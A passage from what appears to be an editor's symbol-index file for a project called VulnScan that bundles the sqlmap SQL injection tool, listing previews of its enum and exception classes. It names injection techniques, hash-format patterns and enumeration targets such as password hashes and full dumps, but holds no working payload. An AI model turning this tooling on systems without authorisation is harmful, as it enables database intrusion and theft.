        "peekOfCode": "class CUSTOM_LOGGING(object):\n    PAYLOAD = 9\n    TRAFFIC_OUT = 8\n    TRAFFIC_IN = 7\nclass OS(object):\n    LINUX = \"Linux\"\n    WINDOWS = \"Windows\"\nclass PLACE(object):\n    GET = \"GET\"\n    POST = \"POST\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "OS",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class OS(object):\n    LINUX = \"Linux\"\n    WINDOWS = \"Windows\"\nclass PLACE(object):\n    GET = \"GET\"\n    POST = \"POST\"\n    URI = \"URI\"\n    COOKIE = \"Cookie\"\n    USER_AGENT = \"User-Agent\"\n    REFERER = \"Referer\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "PLACE",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class PLACE(object):\n    GET = \"GET\"\n    POST = \"POST\"\n    URI = \"URI\"\n    COOKIE = \"Cookie\"\n    USER_AGENT = \"User-Agent\"\n    REFERER = \"Referer\"\n    HOST = \"Host\"\n    CUSTOM_POST = \"(custom) POST\"\n    CUSTOM_HEADER = \"(custom) HEADER\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "POST_HINT",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class POST_HINT(object):\n    SOAP = \"SOAP\"\n    JSON = \"JSON\"\n    JSON_LIKE = \"JSON-like\"\n    MULTIPART = \"MULTIPART\"\n    XML = \"XML (generic)\"\n    ARRAY_LIKE = \"Array-like\"\nclass HTTPMETHOD(object):\n    GET = \"GET\"\n    POST = \"POST\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "HTTPMETHOD",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class HTTPMETHOD(object):\n    GET = \"GET\"\n    POST = \"POST\"\n    HEAD = \"HEAD\"\n    PUT = \"PUT\"\n    DELETE = \"DELETE\"\n    TRACE = \"TRACE\"\n    OPTIONS = \"OPTIONS\"\n    CONNECT = \"CONNECT\"\n    PATCH = \"PATCH\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "NULLCONNECTION",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class NULLCONNECTION(object):\n    HEAD = \"HEAD\"\n    RANGE = \"Range\"\n    SKIP_READ = \"skip-read\"\nclass REFLECTIVE_COUNTER(object):\n    MISS = \"MISS\"\n    HIT = \"HIT\"\nclass CHARSET_TYPE(object):\n    BINARY = 1\n    DIGITS = 2",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "REFLECTIVE_COUNTER",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class REFLECTIVE_COUNTER(object):\n    MISS = \"MISS\"\n    HIT = \"HIT\"\nclass CHARSET_TYPE(object):\n    BINARY = 1\n    DIGITS = 2\n    HEXADECIMAL = 3\n    ALPHA = 4\n    ALPHANUM = 5\nclass HEURISTIC_TEST(object):",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "CHARSET_TYPE",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class CHARSET_TYPE(object):\n    BINARY = 1\n    DIGITS = 2\n    HEXADECIMAL = 3\n    ALPHA = 4\n    ALPHANUM = 5\nclass HEURISTIC_TEST(object):\n    CASTED = 1\n    NEGATIVE = 2\n    POSITIVE = 3",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "HEURISTIC_TEST",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class HEURISTIC_TEST(object):\n    CASTED = 1\n    NEGATIVE = 2\n    POSITIVE = 3\nclass HASH(object):\n    MYSQL = r'(?i)\\A\\*[0-9a-f]{40}\\Z'\n    MYSQL_OLD = r'(?i)\\A(?![0-9]+\\Z)[0-9a-f]{16}\\Z'\n    POSTGRES = r'(?i)\\Amd5[0-9a-f]{32}\\Z'\n    MSSQL = r'(?i)\\A0x0100[0-9a-f]{8}[0-9a-f]{40}\\Z'\n    MSSQL_OLD = r'(?i)\\A0x0100[0-9a-f]{8}[0-9a-f]{80}\\Z'",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "HASH",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class HASH(object):\n    MYSQL = r'(?i)\\A\\*[0-9a-f]{40}\\Z'\n    MYSQL_OLD = r'(?i)\\A(?![0-9]+\\Z)[0-9a-f]{16}\\Z'\n    POSTGRES = r'(?i)\\Amd5[0-9a-f]{32}\\Z'\n    MSSQL = r'(?i)\\A0x0100[0-9a-f]{8}[0-9a-f]{40}\\Z'\n    MSSQL_OLD = r'(?i)\\A0x0100[0-9a-f]{8}[0-9a-f]{80}\\Z'\n    MSSQL_NEW = r'(?i)\\A0x0200[0-9a-f]{8}[0-9a-f]{128}\\Z'\n    ORACLE = r'(?i)\\As:[0-9a-f]{60}\\Z'\n    ORACLE_OLD = r'(?i)\\A[0-9a-f]{16}\\Z'\n    MD5_GENERIC = r'(?i)\\A(0x)?[0-9a-f]{32}\\Z'",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "MOBILES",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class MOBILES(object):\n    BLACKBERRY = (\"BlackBerry Z10\", \"Mozilla/5.0 (BB10; Kbd) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.3.2205 Mobile Safari/537.35+\")\n    GALAXY = (\"Samsung Galaxy S8\", \"Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 Puffin/9.0.0.50263AP\")\n    HP = (\"HP iPAQ 6365\", \"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; HP iPAQ h6300)\")\n    HTC = (\"HTC 10\", \"Mozilla/5.0 (Linux; Android 8.0.0; HTC 10 Build/OPR1.170623.027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36\")\n    HUAWEI = (\"Huawei P8\", \"Mozilla/5.0 (Linux; Android 4.4.4; HUAWEI H891L Build/HuaweiH891L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\")\n    IPHONE = (\"Apple iPhone 8\", \"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1\")\n    LUMIA = (\"Microsoft Lumia 950\", \"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15063\")\n    NEXUS = (\"Google Nexus 7\", \"Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19\")\n    NOKIA = (\"Nokia N97\", \"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "PROXY_TYPE",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class PROXY_TYPE(object):\n    HTTP = \"HTTP\"\n    HTTPS = \"HTTPS\"\n    SOCKS4 = \"SOCKS4\"\n    SOCKS5 = \"SOCKS5\"\nclass REGISTRY_OPERATION(object):\n    READ = \"read\"\n    ADD = \"add\"\n    DELETE = \"delete\"\nclass DUMP_FORMAT(object):",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "REGISTRY_OPERATION",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class REGISTRY_OPERATION(object):\n    READ = \"read\"\n    ADD = \"add\"\n    DELETE = \"delete\"\nclass DUMP_FORMAT(object):\n    CSV = \"CSV\"\n    HTML = \"HTML\"\n    SQLITE = \"SQLITE\"\nclass HTTP_HEADER(object):\n    ACCEPT = \"Accept\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "DUMP_FORMAT",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class DUMP_FORMAT(object):\n    CSV = \"CSV\"\n    HTML = \"HTML\"\n    SQLITE = \"SQLITE\"\nclass HTTP_HEADER(object):\n    ACCEPT = \"Accept\"\n    ACCEPT_CHARSET = \"Accept-Charset\"\n    ACCEPT_ENCODING = \"Accept-Encoding\"\n    ACCEPT_LANGUAGE = \"Accept-Language\"\n    AUTHORIZATION = \"Authorization\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class HTTP_HEADER(object):\n    ACCEPT = \"Accept\"\n    ACCEPT_CHARSET = \"Accept-Charset\"\n    ACCEPT_ENCODING = \"Accept-Encoding\"\n    ACCEPT_LANGUAGE = \"Accept-Language\"\n    AUTHORIZATION = \"Authorization\"\n    CACHE_CONTROL = \"Cache-Control\"\n    CONNECTION = \"Connection\"\n    CONTENT_ENCODING = \"Content-Encoding\"\n    CONTENT_LENGTH = \"Content-Length\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "EXPECTED",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class EXPECTED(object):\n    BOOL = \"bool\"\n    INT = \"int\"\nclass OPTION_TYPE(object):\n    BOOLEAN = \"boolean\"\n    INTEGER = \"integer\"\n    FLOAT = \"float\"\n    STRING = \"string\"\nclass HASHDB_KEYS(object):\n    DBMS = \"DBMS\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "OPTION_TYPE",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class OPTION_TYPE(object):\n    BOOLEAN = \"boolean\"\n    INTEGER = \"integer\"\n    FLOAT = \"float\"\n    STRING = \"string\"\nclass HASHDB_KEYS(object):\n    DBMS = \"DBMS\"\n    DBMS_FORK = \"DBMS_FORK\"\n    CHECK_WAF_RESULT = \"CHECK_WAF_RESULT\"\n    CHECK_NULL_CONNECTION_RESULT = \"CHECK_NULL_CONNECTION_RESULT\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "HASHDB_KEYS",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class HASHDB_KEYS(object):\n    DBMS = \"DBMS\"\n    DBMS_FORK = \"DBMS_FORK\"\n    CHECK_WAF_RESULT = \"CHECK_WAF_RESULT\"\n    CHECK_NULL_CONNECTION_RESULT = \"CHECK_NULL_CONNECTION_RESULT\"\n    CONF_TMP_PATH = \"CONF_TMP_PATH\"\n    KB_ABS_FILE_PATHS = \"KB_ABS_FILE_PATHS\"\n    KB_BRUTE_COLUMNS = \"KB_BRUTE_COLUMNS\"\n    KB_BRUTE_TABLES = \"KB_BRUTE_TABLES\"\n    KB_CHARS = \"KB_CHARS\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "REDIRECTION",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class REDIRECTION(object):\n    YES = 'Y'\n    NO = 'N'\nclass PAYLOAD(object):\n    SQLINJECTION = {\n        1: \"boolean-based blind\",\n        2: \"error-based\",\n        3: \"inline query\",\n        4: \"stacked queries\",\n        5: \"time-based blind\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "PAYLOAD",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class PAYLOAD(object):\n    SQLINJECTION = {\n        1: \"boolean-based blind\",\n        2: \"error-based\",\n        3: \"inline query\",\n        4: \"stacked queries\",\n        5: \"time-based blind\",\n        6: \"UNION query\",\n    }\n    PARAMETER = {",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "WIZARD",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class WIZARD(object):\n    BASIC = (\"getBanner\", \"getCurrentUser\", \"getCurrentDb\", \"isDba\")\n    INTERMEDIATE = (\"getBanner\", \"getCurrentUser\", \"getCurrentDb\", \"isDba\", \"getUsers\", \"getDbs\", \"getTables\", \"getSchema\", \"excludeSysDbs\")\n    ALL = (\"getBanner\", \"getCurrentUser\", \"getCurrentDb\", \"isDba\", \"getHostname\", \"getUsers\", \"getPasswordHashes\", \"getPrivileges\", \"getRoles\", \"dumpAll\")\nclass ADJUST_TIME_DELAY(object):\n    DISABLE = -1\n    NO = 0\n    YES = 1\nclass WEB_PLATFORM(object):\n    PHP = \"php\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "ADJUST_TIME_DELAY",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class ADJUST_TIME_DELAY(object):\n    DISABLE = -1\n    NO = 0\n    YES = 1\nclass WEB_PLATFORM(object):\n    PHP = \"php\"\n    ASP = \"asp\"\n    ASPX = \"aspx\"\n    JSP = \"jsp\"\nclass CONTENT_TYPE(object):",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "WEB_PLATFORM",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class WEB_PLATFORM(object):\n    PHP = \"php\"\n    ASP = \"asp\"\n    ASPX = \"aspx\"\n    JSP = \"jsp\"\nclass CONTENT_TYPE(object):\n    TARGET = 0\n    TECHNIQUES = 1\n    DBMS_FINGERPRINT = 2\n    BANNER = 3",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "CONTENT_TYPE",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class CONTENT_TYPE(object):\n    TARGET = 0\n    TECHNIQUES = 1\n    DBMS_FINGERPRINT = 2\n    BANNER = 3\n    CURRENT_USER = 4\n    CURRENT_DB = 5\n    HOSTNAME = 6\n    IS_DBA = 7\n    USERS = 8",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "CONTENT_STATUS",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class CONTENT_STATUS(object):\n    IN_PROGRESS = 0\n    COMPLETE = 1\nclass AUTH_TYPE(object):\n    BASIC = \"basic\"\n    DIGEST = \"digest\"\n    BEARER = \"bearer\"\n    NTLM = \"ntlm\"\n    PKI = \"pki\"\nclass AUTOCOMPLETE_TYPE(object):",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "AUTH_TYPE",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class AUTH_TYPE(object):\n    BASIC = \"basic\"\n    DIGEST = \"digest\"\n    BEARER = \"bearer\"\n    NTLM = \"ntlm\"\n    PKI = \"pki\"\nclass AUTOCOMPLETE_TYPE(object):\n    SQL = 0\n    OS = 1\n    SQLMAP = 2",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "AUTOCOMPLETE_TYPE",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class AUTOCOMPLETE_TYPE(object):\n    SQL = 0\n    OS = 1\n    SQLMAP = 2\n    API = 3\nclass NOTE(object):\n    FALSE_POSITIVE_OR_UNEXPLOITABLE = \"false positive or unexploitable\"\nclass MKSTEMP_PREFIX(object):\n    HASHES = \"sqlmaphashes-\"\n    CRAWLER = \"sqlmapcrawler-\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "NOTE",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class NOTE(object):\n    FALSE_POSITIVE_OR_UNEXPLOITABLE = \"false positive or unexploitable\"\nclass MKSTEMP_PREFIX(object):\n    HASHES = \"sqlmaphashes-\"\n    CRAWLER = \"sqlmapcrawler-\"\n    IPC = \"sqlmapipc-\"\n    CONFIG = \"sqlmapconfig-\"\n    TESTING = \"sqlmaptesting-\"\n    RESULTS = \"sqlmapresults-\"\n    COOKIE_JAR = \"sqlmapcookiejar-\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "MKSTEMP_PREFIX",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class MKSTEMP_PREFIX(object):\n    HASHES = \"sqlmaphashes-\"\n    CRAWLER = \"sqlmapcrawler-\"\n    IPC = \"sqlmapipc-\"\n    CONFIG = \"sqlmapconfig-\"\n    TESTING = \"sqlmaptesting-\"\n    RESULTS = \"sqlmapresults-\"\n    COOKIE_JAR = \"sqlmapcookiejar-\"\n    BIG_ARRAY = \"sqlmapbigarray-\"\n    SPECIFIC_RESPONSE = \"sqlmapresponse-\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "TIMEOUT_STATE",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class TIMEOUT_STATE(object):\n    NORMAL = 0\n    EXCEPTION = 1\n    TIMEOUT = 2\nclass HINT(object):\n    PREPEND = 0\n    APPEND = 1\nclass FUZZ_UNION_COLUMN:\n    STRING = \"<string>\"\n    INTEGER = \"<integer>\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "HINT",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class HINT(object):\n    PREPEND = 0\n    APPEND = 1\nclass FUZZ_UNION_COLUMN:\n    STRING = \"<string>\"\n    INTEGER = \"<integer>\"\n    NULL = \"NULL\"\nclass COLOR:\n    BLUE = \"\\033[34m\"\n    BOLD_MAGENTA = \"\\033[35;1m\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "FUZZ_UNION_COLUMN",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class FUZZ_UNION_COLUMN:\n    STRING = \"<string>\"\n    INTEGER = \"<integer>\"\n    NULL = \"NULL\"\nclass COLOR:\n    BLUE = \"\\033[34m\"\n    BOLD_MAGENTA = \"\\033[35;1m\"\n    BOLD_GREEN = \"\\033[32;1m\"\n    BOLD_LIGHT_MAGENTA = \"\\033[95;1m\"\n    LIGHT_GRAY = \"\\033[37m\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "COLOR",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class COLOR:\n    BLUE = \"\\033[34m\"\n    BOLD_MAGENTA = \"\\033[35;1m\"\n    BOLD_GREEN = \"\\033[32;1m\"\n    BOLD_LIGHT_MAGENTA = \"\\033[95;1m\"\n    LIGHT_GRAY = \"\\033[37m\"\n    BOLD_RED = \"\\033[31;1m\"\n    BOLD_LIGHT_GRAY = \"\\033[37;1m\"\n    YELLOW = \"\\033[33m\"\n    DARK_GRAY = \"\\033[90m\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "BACKGROUND",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.enums",
        "description": "VulnScan.modules.sqlmap.lib.core.enums",
        "peekOfCode": "class BACKGROUND:\n    BLUE = \"\\033[44m\"\n    LIGHT_GRAY = \"\\033[47m\"\n    YELLOW = \"\\033[43m\"\n    DARK_GRAY = \"\\033[100m\"\n    LIGHT_RED = \"\\033[101m\"\n    CYAN = \"\\033[46m\"\n    MAGENTA = \"\\033[45m\"\n    LIGHT_MAGENTA = \"\\033[105m\"\n    LIGHT_GREEN = \"\\033[102m\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.enums",
        "documentation": {}
    },
    {
        "label": "SqlmapBaseException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapBaseException(Exception):\n    pass\nclass SqlmapCompressionException(SqlmapBaseException):\n    pass\nclass SqlmapConnectionException(SqlmapBaseException):\n    pass\nclass SqlmapDataException(SqlmapBaseException):\n    pass\nclass SqlmapFilePathException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapCompressionException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapCompressionException(SqlmapBaseException):\n    pass\nclass SqlmapConnectionException(SqlmapBaseException):\n    pass\nclass SqlmapDataException(SqlmapBaseException):\n    pass\nclass SqlmapFilePathException(SqlmapBaseException):\n    pass\nclass SqlmapGenericException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapConnectionException(SqlmapBaseException):\n    pass\nclass SqlmapDataException(SqlmapBaseException):\n    pass\nclass SqlmapFilePathException(SqlmapBaseException):\n    pass\nclass SqlmapGenericException(SqlmapBaseException):\n    pass\nclass SqlmapInstallationException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapDataException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapDataException(SqlmapBaseException):\n    pass\nclass SqlmapFilePathException(SqlmapBaseException):\n    pass\nclass SqlmapGenericException(SqlmapBaseException):\n    pass\nclass SqlmapInstallationException(SqlmapBaseException):\n    pass\nclass SqlmapMissingDependence(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapFilePathException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapFilePathException(SqlmapBaseException):\n    pass\nclass SqlmapGenericException(SqlmapBaseException):\n    pass\nclass SqlmapInstallationException(SqlmapBaseException):\n    pass\nclass SqlmapMissingDependence(SqlmapBaseException):\n    pass\nclass SqlmapMissingMandatoryOptionException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapGenericException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapGenericException(SqlmapBaseException):\n    pass\nclass SqlmapInstallationException(SqlmapBaseException):\n    pass\nclass SqlmapMissingDependence(SqlmapBaseException):\n    pass\nclass SqlmapMissingMandatoryOptionException(SqlmapBaseException):\n    pass\nclass SqlmapMissingPrivileges(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapInstallationException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapInstallationException(SqlmapBaseException):\n    pass\nclass SqlmapMissingDependence(SqlmapBaseException):\n    pass\nclass SqlmapMissingMandatoryOptionException(SqlmapBaseException):\n    pass\nclass SqlmapMissingPrivileges(SqlmapBaseException):\n    pass\nclass SqlmapNoneDataException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingDependence",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapMissingDependence(SqlmapBaseException):\n    pass\nclass SqlmapMissingMandatoryOptionException(SqlmapBaseException):\n    pass\nclass SqlmapMissingPrivileges(SqlmapBaseException):\n    pass\nclass SqlmapNoneDataException(SqlmapBaseException):\n    pass\nclass SqlmapNotVulnerableException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingMandatoryOptionException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapMissingMandatoryOptionException(SqlmapBaseException):\n    pass\nclass SqlmapMissingPrivileges(SqlmapBaseException):\n    pass\nclass SqlmapNoneDataException(SqlmapBaseException):\n    pass\nclass SqlmapNotVulnerableException(SqlmapBaseException):\n    pass\nclass SqlmapSilentQuitException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingPrivileges",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapMissingPrivileges(SqlmapBaseException):\n    pass\nclass SqlmapNoneDataException(SqlmapBaseException):\n    pass\nclass SqlmapNotVulnerableException(SqlmapBaseException):\n    pass\nclass SqlmapSilentQuitException(SqlmapBaseException):\n    pass\nclass SqlmapUserQuitException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
